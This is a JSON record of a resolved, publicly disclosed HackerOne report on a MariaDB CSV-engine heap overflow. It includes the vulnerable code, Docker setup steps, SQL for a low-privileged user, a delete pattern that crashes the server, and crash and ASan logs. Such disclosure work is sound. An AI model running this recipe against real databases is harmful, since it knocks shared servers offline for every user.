@@ -1,0 +1,146 @@
+{
+  "id": 3909248,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTA5MjQ4",
+  "url": "https://hackerone.com/reports/3909248",
+  "title": "MariaDB: heap buffer overflow in ha_tina::chain_append() lets a low-privileged user crash the server via CSV row deletion",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-08-02T04:33:42.646Z",
+  "submitted_at": "2026-08-02T04:33:42.979Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "v3rtical",
+    "url": "/v3rtical",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d8zevhx3qkz8bgk9qr08swk4l0am/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-07T19:59:03.034Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-07T19:59:02.799Z",
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:46:31.905Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\n`chain_size` counts elements of the 16-byte `tina_set` struct. On the first array growth the code takes the `my_malloc` path and correctly requests `chain_size * sizeof(tina_set)` bytes. On the second growth it takes the `my_realloc` path and requests `chain_size` bytes, a 16x under-allocation. The next `chain_append()` then writes a `tina_set` at element index 1023 of a 1536-byte block, roughly 14.8 KB out of bounds, and every further append extends the overflow. The write value is attacker-influenced (byte offsets of deleted rows in the CSV data file) and the overflow length is attacker-chosen (the number of deleted rows). The reachable and demonstrated consequence is a remote denial of service from the lowest useful privilege level.\n\n## Target Details\n\nConfirmed on two builds:\n\n| | |\n|---|---|\n| Stock package | `mariadb-server` 10.11.14-0ubuntu0.24.04.1 (Ubuntu 24.04 LTS, default config) |\n| Source build | MariaDB 13.1.0 at commit `548c80aeafb`, `RelWithDebInfo` and ASan `Debug` |\n| libc / arch | glibc 2.39, aarch64 Linux |\n| Allocator | glibc `malloc` (the stock Ubuntu package links no jemalloc) |\n\n## Vulnerable Code\n\n**File:** `storage/csv/ha_tina.cc`, function `ha_tina::chain_append()`, lines 642-666\n\n```c\n    if ((off_t)(chain_ptr - chain) == (chain_size -1))       // Line 642: chain_size is an element COUNT (pointer arithmetic)\n    {\n      my_off_t location= chain_ptr - chain;\n      chain_size += DEFAULT_CHAIN_LENGTH;\n      if (chain_alloced)\n      {\n        if ((chain= (tina_set *) my_realloc(csv_key_memory_tina_set,\n                                            (uchar*)chain, chain_size,       // Line 650: COUNT passed as BYTE size, no * sizeof(tina_set)\n                                            MYF(MY_WME))) == NULL)\n          return -1;\n      }\n      else\n      {\n        tina_set *ptr= (tina_set *) my_malloc(csv_key_memory_tina_set,\n                                              chain_size * sizeof(tina_set),   // Line 657: sibling branch multiplies correctly\n                                              MYF(MY_WME));\n        memcpy(ptr, chain, DEFAULT_CHAIN_LENGTH * sizeof(tina_set));\n        chain= ptr;\n        chain_alloced++;\n      }\n      chain_ptr= chain + location;\n    }\n    chain_ptr->begin= current_position;    // Line 664: 8-byte heap write, index unbounded by the real allocation size\n    chain_ptr->end= next_position;         // Line 665: second 8-byte heap write\n    chain_ptr++;\n```\n\nThe two growth branches are the secure-sibling contrast: the `my_malloc` branch at line 657 multiplies `chain_size` by `sizeof(tina_set)`; the `my_realloc` branch at line 650 does not. `tina_set` is 16 bytes and `DEFAULT_CHAIN_LENGTH` is 512:\n\n```c\n// storage/csv/ha_tina.h\n#define DEFAULT_CHAIN_LENGTH 512   // Line 21\nstruct tina_set {                  // Line 55\n  my_off_t begin;                  //   8 bytes\n  my_off_t end;                    //   8 bytes  -> sizeof(tina_set) == 16\n};\nuint32 chain_size;                 // Line 82: the element counter\n```\n\nGrowth sequence:\n\n- `chain_size` starts at 512 (`ha_tina.cc:531`).\n- First growth: `chain_size` becomes 1024, `chain_alloced == 0`, so `my_malloc(1024 * 16)` = 16384 bytes. Correct. `chain_alloced` is set.\n- Second growth: `chain_size` becomes 1536, `chain_alloced != 0`, so `my_realloc(chain, 1536)` bytes where `1536 * 16` = 24576 are needed. 16x under-allocation.\n- The next append writes at element index 1023: byte offset `1023 * 16` = 16368 into a 1536-byte block.\n\n## Steps to Reproduce\n\n### Step 1. Stand up a stock MariaDB server\n\nAny default MariaDB install works. A clean container reproduces it from the distro package with no custom build:\n\n```bash\ndocker run -dit --name mdb-poc -p 13306:3306 ubuntu:24.04 bash\ndocker exec mdb-poc bash -c 'apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq mariadb-server'\ndocker exec mdb-poc bash -c 'mkdir -p /run/mysqld && chown mysql:mysql /run/mysqld'\ndocker exec mdb-poc bash -c 'printf \"[mysqld]\\nbind-address=0.0.0.0\\n\" > /etc/mysql/mariadb.conf.d/99-poc.cnf'\ndocker exec -d mdb-poc bash -c '/usr/sbin/mariadbd --user=mysql > /var/log/mariadb.log 2>&1'\n```\n\nThe server listens on the host at `127.0.0.1:13306`.\n\n### Step 2. Create a low-privileged user\n\nRun this as an administrator. It grants only `SELECT`, `INSERT`, `DELETE`, `CREATE` on one schema and nothing global.\n\n```sql\nCREATE DATABASE csvpoc;\nCREATE USER lowpriv@'%' IDENTIFIED BY 'pw123';\nGRANT SELECT, INSERT, DELETE, CREATE ON csvpoc.* TO lowpriv@'%';\nFLUSH PRIVILEGES;\n```\n\nThe account holds no `FILE`, `SUPER`, `PROCESS`, or `RELOAD` privilege. `SHOW GRANTS FOR lowpriv@'%'` returns exactly `USAGE ON *.*` plus the four schema-scoped grants, and `SELECT LOAD_FILE('/etc/passwd')` returns `NULL`, confirming no file access.\n\n### Step 3. Trigger the overflow as the low-privileged user\n\nRun the attached `mariadb_csv_dos.py` from any host that can reach the server. It authenticates as `lowpriv`, creates a CSV table, inserts 2048 rows, and issues one `DELETE`.\n\n```bash\npython3 mariadb_csv_dos.py --host 127.0.0.1 --port 13306 --user lowpriv --password pw123\n```\n\nSubstitute your own host, port and credentials. Observed output:\n\n```\ntarget: 10.11.14-MariaDB-0ubuntu0.24.04.1\nrows: 2048\ndeleting every other row (1024 holes)\nconnection dropped during DELETE\nserver no longer accepts connections\n```\n\nThe `DELETE` must produce non-adjacent holes. `ha_tina.cc:637-638` merges consecutive deleted rows into a single chain entry, so `id % 2 = 0` (delete every other row) yields 1024 separate entries and reaches the second growth, while a plain `DELETE FROM t` would collapse to one entry and not trigger it. With 2048 rows this needs `INSERT` and one `DELETE`; no restart, no crafted file.\n\n{F6376194}\n\n### Step 4. Confirm the server is wedged\n\nThe `DELETE` connection is dropped and the server stops answering. Inspect the server-side log:\n\n```bash\ndocker exec mdb-poc grep -aiE 'malloc\\(\\)|got signal|shutdown|did not exit' /var/log/mariadb.log\n```\n\nObserved:\n\n```\nmalloc(): mismatching next->prev_size (unsorted)\n/usr/sbin/mariadbd got signal 6 ;\n[Note] /usr/sbin/mariadbd (initiated by: unknown): Normal shutdown\n[Warning] /usr/sbin/mariadbd: Thread N (user : 'lowpriv') did not exit\n```\n\n{F6376195}\n\n\n\nThe first three lines appear immediately. The `did not exit` warning is emitted by a shutdown watchdog and appears roughly 20 to 30 seconds after the crash; re-run the grep after a short wait if it is not present yet. The thread number varies per run.\n\nThe process is still present but idle and serving nobody. Run both probes inside the container so the connection attempt does not pass through Docker's host port proxy, which stays up and would mask the refusal:\n\n```bash\ndocker exec mdb-dos bash -c 'pgrep -x mariadbd && echo \"PROCESS ALIVE\"'                # prints a PID: the process did not exit\ndocker exec mdb-dos mariadb -h 127.0.0.1 -u lowpriv -ppw123 -e 'SELECT 1 AS alive;'   \n```\n\nObserved:\n\n```\n1190\nALIVE\nERROR 2002 (HY000): Can't connect to server on '127.0.0.1' (115)\n```\n\nglibc detects the corrupted chunk header and calls `abort()` while holding the arena mutex. MariaDB's `SIGABRT` handler then calls `backtrace()`, which `dlopen()`s `libgcc_s.so.1` and calls `malloc()`, blocking forever on the mutex `abort()` still holds. The shutdown the handler starts never completes, so the process neither exits nor serves. Recovery requires `kill -9` and a restart.\n\n{F6376202}\n\n### AddressSanitizer confirmation\n\nAn ASan `Debug` build of `548c80aeafb` reports the same operation as a clean heap-buffer-overflow write, proving the defect is a genuine out-of-bounds write and not merely a heap-consistency assertion:\n\n```\n==ERROR: AddressSanitizer: heap-buffer-overflow\nWRITE of size 8 at 0x51b000043e90 thread T13\n    #0 ha_tina::chain_append()                     storage/csv/ha_tina.cc:664\n    #1 ha_tina::delete_row(unsigned char const*)   storage/csv/ha_tina.cc:1137\n    #2 handler::ha_delete_row(unsigned char const*) sql/handler.cc:8686\n    #3 TABLE::delete_row<false>(bool)               sql/sql_delete.cc:369\n    #5 Sql_cmd_delete::delete_from_single_table     sql/sql_delete.cc:964\n    #8 mysql_execute_command(THD*, bool)            sql/sql_parse.cc:4446\n   #10 dispatch_command(...)                        sql/sql_parse.cc:1903\nSUMMARY: AddressSanitizer: heap-buffer-overflow storage/csv/ha_tina.cc:664 in ha_tina::chain_append()\n```\n\nThe stack runs straight from the SQL command dispatcher through `Sql_cmd_delete` into `chain_append`, confirming the write is reached by an ordinary `DELETE` with no special code path.\n\n## Impact\n\n## Impact\n\nA user whose only rights are `SELECT`, `INSERT`, `DELETE` and `CREATE` on one schema can crash the entire database instance with two SQL statements, dropping every connection and every other tenant on the server. This is an availability break that crosses a clear trust boundary. The trigger requires no `FILE` privilege, no plugin, no crafted file on disk, and no configuration change from defaults, because CSV is a built-in engine present in every build and also backs `mysql.slow_log` and `mysql.general_log`.\n\nThe failure mode is worse than a clean crash. glibc calls `abort()` while holding the arena mutex, and MariaDB's crash handler then deadlocks inside `backtrace()` calling `malloc()`, so the process does not exit. It remains alive and idle while refusing all connections. Supervisors that treat process existence as health (`systemd` with `Restart=on-failure`, `mysqld_safe`, container liveness probes checking the PID) see a running process and do not restart it, turning a crash into a hung service that needs manual `kill -9` and restart. The attack is scriptable and repeatable.",
+  "weakness": {
+    "id": 5,
+    "name": "Heap Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6376194,
+      "file_name": "Screenshot_2026-08-01_at_11.35.00_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mqjedzrwu9slkoph5m902277y72y?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-08-01_at_11.35.00_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-08-01_at_11.35.00_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7JX7WYBK%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T205950Z&X-Amz-Expires=2888&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIHSDIX3noFwKXlXFq84VyNoS6SRdQBRYWYFoiZ9eZgyhAiEApCfFJ4byXBL%2FCpDErX4nt7AfW9iQJMI97UfUvg01w3UqsgUIQRADGgwwMTM2MTkyNzQ4NDkiDD%2BmB9DXaN2%2FDJUZQCqPBUk3o73CLTVlOeaGTvytm%2BgavCoOzlkY6xuSKncS0NH7xfXpoqPK5HaW7tupJz8%2B9PHlPMixkIvoSGO6qs5ss1IOQU%2BkIB9NLzz28mBzXyjR2vOG1Gu09H2jpwXcHarpWsekK8cbocrMLIWSg8KZYg06vOQI8WnKdqtyUds8yhaykrslia9F9WLkZbIqmv5yLnnKUTNF4UxopLp6CZ5C1u8CEQI7mHwdYeHJKE8BYKe%2FXBj1XEhaGQwM6hNYSvy32lvkCzsJpXccvcTFBUGLS3Jcojyje0hW72OSRj77G5bBWH7JYrhY%2BwIRCqk3OJ5Bm%2FfRnGOy89Kp2n9k9x97Xz8HBdFLzepiRKd9XDC8qzSrs78iXJM1yocjYHrs%2BAvhalZeOnT34IWZ5LfVxs4voK9UyQNcqcONN9Y5aFgcZV%2BW%2Bb6cvbYDykdguL%2BF0u8stYOr6tBdCkubpkZ8HqcJyuyhA3nsJtMtPBdteUEtcDFQ1z2g8dZeYjIvpOoSYaBIwcFavghftPvneLvvegu9nV%2BakCyOw0tjfR7x7aptnAZYp22agBW23%2B3%2FL7yYeqH0W0aBsTKKXHWOKlK5n78qvtcFXEMndv7SERrr8KNeJL7NRjFKAJH24OfeR0dlrbgwZtInlPe4aYU4PHGsv2EG7p1uwLAh%2BooPoCB%2B6APk5iELxF%2BeEgjYcOa8hCqywsF0GuxDgukKAbsJbak6H3rhxot4HdbffDVpNYqyYmJAsDtnhIaaeREGu4JSKfGPkNUUjltH5gpujklMiv%2B9uRz0Ew4Wm8gjbegc4ht9Cni4SEy5TCXw9GYx0ha7nf1GCamnv8f%2Bfnqdcy04711e4UY4wYQkeWCJOOjzjFKzh9Ic4Fswk7H71AY6sQEP3BlR7SUdPAG3p7ZoHL7fdN7rmsehBmxkCUow%2FG8uoeOt0iRoYYzkfHshZZeC70Tbtm1dGufvHqfnW43exYdHgtz1MomZeyFA0PVtiN4F4BUbpcxRx48%2FDa7YEFy86ahhDBY2TdRuhCG2L%2B89M4xvqQHRhnUw6TNIiLaZSrpfBK1hCAUokZmLMS23Gz37av04XFPTHUb%2Be6rIgUID7hP7vMZ77FC9krueEPGE0hGZW5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=162a674bdfbb3fab08872b72f2237cdec0632149afcdfff6fb6ad83b38defd42",
+      "file_size": 400400,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6376195,
+      "file_name": "Screenshot_2026-08-01_at_11.38.30_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xi07q525sqirnobqte48wxskpmcs?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-08-01_at_11.38.30_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-08-01_at_11.38.30_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7JX7WYBK%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T205950Z&X-Amz-Expires=2888&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIHSDIX3noFwKXlXFq84VyNoS6SRdQBRYWYFoiZ9eZgyhAiEApCfFJ4byXBL%2FCpDErX4nt7AfW9iQJMI97UfUvg01w3UqsgUIQRADGgwwMTM2MTkyNzQ4NDkiDD%2BmB9DXaN2%2FDJUZQCqPBUk3o73CLTVlOeaGTvytm%2BgavCoOzlkY6xuSKncS0NH7xfXpoqPK5HaW7tupJz8%2B9PHlPMixkIvoSGO6qs5ss1IOQU%2BkIB9NLzz28mBzXyjR2vOG1Gu09H2jpwXcHarpWsekK8cbocrMLIWSg8KZYg06vOQI8WnKdqtyUds8yhaykrslia9F9WLkZbIqmv5yLnnKUTNF4UxopLp6CZ5C1u8CEQI7mHwdYeHJKE8BYKe%2FXBj1XEhaGQwM6hNYSvy32lvkCzsJpXccvcTFBUGLS3Jcojyje0hW72OSRj77G5bBWH7JYrhY%2BwIRCqk3OJ5Bm%2FfRnGOy89Kp2n9k9x97Xz8HBdFLzepiRKd9XDC8qzSrs78iXJM1yocjYHrs%2BAvhalZeOnT34IWZ5LfVxs4voK9UyQNcqcONN9Y5aFgcZV%2BW%2Bb6cvbYDykdguL%2BF0u8stYOr6tBdCkubpkZ8HqcJyuyhA3nsJtMtPBdteUEtcDFQ1z2g8dZeYjIvpOoSYaBIwcFavghftPvneLvvegu9nV%2BakCyOw0tjfR7x7aptnAZYp22agBW23%2B3%2FL7yYeqH0W0aBsTKKXHWOKlK5n78qvtcFXEMndv7SERrr8KNeJL7NRjFKAJH24OfeR0dlrbgwZtInlPe4aYU4PHGsv2EG7p1uwLAh%2BooPoCB%2B6APk5iELxF%2BeEgjYcOa8hCqywsF0GuxDgukKAbsJbak6H3rhxot4HdbffDVpNYqyYmJAsDtnhIaaeREGu4JSKfGPkNUUjltH5gpujklMiv%2B9uRz0Ew4Wm8gjbegc4ht9Cni4SEy5TCXw9GYx0ha7nf1GCamnv8f%2Bfnqdcy04711e4UY4wYQkeWCJOOjzjFKzh9Ic4Fswk7H71AY6sQEP3BlR7SUdPAG3p7ZoHL7fdN7rmsehBmxkCUow%2FG8uoeOt0iRoYYzkfHshZZeC70Tbtm1dGufvHqfnW43exYdHgtz1MomZeyFA0PVtiN4F4BUbpcxRx48%2FDa7YEFy86ahhDBY2TdRuhCG2L%2B89M4xvqQHRhnUw6TNIiLaZSrpfBK1hCAUokZmLMS23Gz37av04XFPTHUb%2Be6rIgUID7hP7vMZ77FC9krueEPGE0hGZW5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e51c914082a6224d3ad87d8d02e0f72b2f2f97597962d1f0657196fbf8c26127",
+      "file_size": 211811,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6376202,
+      "file_name": "Screenshot_2026-08-02_at_12.17.36_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/11jea4wqo6l4yvoq0tijlgnbhcmr?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2026-08-02_at_12.17.36_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2026-08-02_at_12.17.36_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7JX7WYBK%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T205950Z&X-Amz-Expires=2888&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIHSDIX3noFwKXlXFq84VyNoS6SRdQBRYWYFoiZ9eZgyhAiEApCfFJ4byXBL%2FCpDErX4nt7AfW9iQJMI97UfUvg01w3UqsgUIQRADGgwwMTM2MTkyNzQ4NDkiDD%2BmB9DXaN2%2FDJUZQCqPBUk3o73CLTVlOeaGTvytm%2BgavCoOzlkY6xuSKncS0NH7xfXpoqPK5HaW7tupJz8%2B9PHlPMixkIvoSGO6qs5ss1IOQU%2BkIB9NLzz28mBzXyjR2vOG1Gu09H2jpwXcHarpWsekK8cbocrMLIWSg8KZYg06vOQI8WnKdqtyUds8yhaykrslia9F9WLkZbIqmv5yLnnKUTNF4UxopLp6CZ5C1u8CEQI7mHwdYeHJKE8BYKe%2FXBj1XEhaGQwM6hNYSvy32lvkCzsJpXccvcTFBUGLS3Jcojyje0hW72OSRj77G5bBWH7JYrhY%2BwIRCqk3OJ5Bm%2FfRnGOy89Kp2n9k9x97Xz8HBdFLzepiRKd9XDC8qzSrs78iXJM1yocjYHrs%2BAvhalZeOnT34IWZ5LfVxs4voK9UyQNcqcONN9Y5aFgcZV%2BW%2Bb6cvbYDykdguL%2BF0u8stYOr6tBdCkubpkZ8HqcJyuyhA3nsJtMtPBdteUEtcDFQ1z2g8dZeYjIvpOoSYaBIwcFavghftPvneLvvegu9nV%2BakCyOw0tjfR7x7aptnAZYp22agBW23%2B3%2FL7yYeqH0W0aBsTKKXHWOKlK5n78qvtcFXEMndv7SERrr8KNeJL7NRjFKAJH24OfeR0dlrbgwZtInlPe4aYU4PHGsv2EG7p1uwLAh%2BooPoCB%2B6APk5iELxF%2BeEgjYcOa8hCqywsF0GuxDgukKAbsJbak6H3rhxot4HdbffDVpNYqyYmJAsDtnhIaaeREGu4JSKfGPkNUUjltH5gpujklMiv%2B9uRz0Ew4Wm8gjbegc4ht9Cni4SEy5TCXw9GYx0ha7nf1GCamnv8f%2Bfnqdcy04711e4UY4wYQkeWCJOOjzjFKzh9Ic4Fswk7H71AY6sQEP3BlR7SUdPAG3p7ZoHL7fdN7rmsehBmxkCUow%2FG8uoeOt0iRoYYzkfHshZZeC70Tbtm1dGufvHqfnW43exYdHgtz1MomZeyFA0PVtiN4F4BUbpcxRx48%2FDa7YEFy86ahhDBY2TdRuhCG2L%2B89M4xvqQHRhnUw6TNIiLaZSrpfBK1hCAUokZmLMS23Gz37av04XFPTHUb%2Be6rIgUID7hP7vMZ77FC9krueEPGE0hGZW5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dc0912608f456bd143573a4abf238a3f1bf4d8ccd2ec7bee29daf9ebdf01ef41",
+      "file_size": 155314,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6376203,
+      "file_name": "mariadb_csv_dos.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aw2ihd6ckg5vm1ymec3yxyw4nbwp?response-content-disposition=attachment%3B%20filename%3D%22mariadb_csv_dos.py%22%3B%20filename%2A%3DUTF-8%27%27mariadb_csv_dos.py&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7JX7WYBK%2F20260907%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260907T205950Z&X-Amz-Expires=2888&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIHSDIX3noFwKXlXFq84VyNoS6SRdQBRYWYFoiZ9eZgyhAiEApCfFJ4byXBL%2FCpDErX4nt7AfW9iQJMI97UfUvg01w3UqsgUIQRADGgwwMTM2MTkyNzQ4NDkiDD%2BmB9DXaN2%2FDJUZQCqPBUk3o73CLTVlOeaGTvytm%2BgavCoOzlkY6xuSKncS0NH7xfXpoqPK5HaW7tupJz8%2B9PHlPMixkIvoSGO6qs5ss1IOQU%2BkIB9NLzz28mBzXyjR2vOG1Gu09H2jpwXcHarpWsekK8cbocrMLIWSg8KZYg06vOQI8WnKdqtyUds8yhaykrslia9F9WLkZbIqmv5yLnnKUTNF4UxopLp6CZ5C1u8CEQI7mHwdYeHJKE8BYKe%2FXBj1XEhaGQwM6hNYSvy32lvkCzsJpXccvcTFBUGLS3Jcojyje0hW72OSRj77G5bBWH7JYrhY%2BwIRCqk3OJ5Bm%2FfRnGOy89Kp2n9k9x97Xz8HBdFLzepiRKd9XDC8qzSrs78iXJM1yocjYHrs%2BAvhalZeOnT34IWZ5LfVxs4voK9UyQNcqcONN9Y5aFgcZV%2BW%2Bb6cvbYDykdguL%2BF0u8stYOr6tBdCkubpkZ8HqcJyuyhA3nsJtMtPBdteUEtcDFQ1z2g8dZeYjIvpOoSYaBIwcFavghftPvneLvvegu9nV%2BakCyOw0tjfR7x7aptnAZYp22agBW23%2B3%2FL7yYeqH0W0aBsTKKXHWOKlK5n78qvtcFXEMndv7SERrr8KNeJL7NRjFKAJH24OfeR0dlrbgwZtInlPe4aYU4PHGsv2EG7p1uwLAh%2BooPoCB%2B6APk5iELxF%2BeEgjYcOa8hCqywsF0GuxDgukKAbsJbak6H3rhxot4HdbffDVpNYqyYmJAsDtnhIaaeREGu4JSKfGPkNUUjltH5gpujklMiv%2B9uRz0Ew4Wm8gjbegc4ht9Cni4SEy5TCXw9GYx0ha7nf1GCamnv8f%2Bfnqdcy04711e4UY4wYQkeWCJOOjzjFKzh9Ic4Fswk7H71AY6sQEP3BlR7SUdPAG3p7ZoHL7fdN7rmsehBmxkCUow%2FG8uoeOt0iRoYYzkfHshZZeC70Tbtm1dGufvHqfnW43exYdHgtz1MomZeyFA0PVtiN4F4BUbpcxRx48%2FDa7YEFy86ahhDBY2TdRuhCG2L%2B89M4xvqQHRhnUw6TNIiLaZSrpfBK1hCAUokZmLMS23Gz37av04XFPTHUb%2Be6rIgUID7hP7vMZ77FC9krueEPGE0hGZW5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f8e5e3d9d78f87dea6c25354b7cc7aaa1493b32167cca5f79cb5915d1a555e9d",
+      "file_size": 3420,
+      "type": "application/x-sh",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-07T19:46:32.086Z",
+  "allow_singular_disclosure_after": 2587601.580320936,
+  "singular_disclosure_allowed": false,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 10337,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors  - Denial of Service",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
